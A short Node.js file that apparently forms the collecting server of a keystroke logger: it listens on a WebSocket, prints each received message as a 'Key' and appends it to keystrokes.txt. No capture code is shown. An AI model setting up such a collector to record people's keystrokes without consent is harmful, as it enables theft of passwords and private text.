const WebSocket = require('ws')
const fs = require('fs')
 
const wss = new WebSocket.Server({ port: 8000 })
 
wss.on('connection', ws => {
  ws.on('message', message => {
    console.log(`Key: ${message}`);
    fs.writeFile('./keystrokes.txt', message, { flag: 'a' }, err => {
        if (err) {
          console.error(err);
        }
      })
  });

  ws.on('close', () => {
    console.log("Connection closed");
  });
  console.log("Connected!");
//   ws.send('Hello! Message From Server!!')
})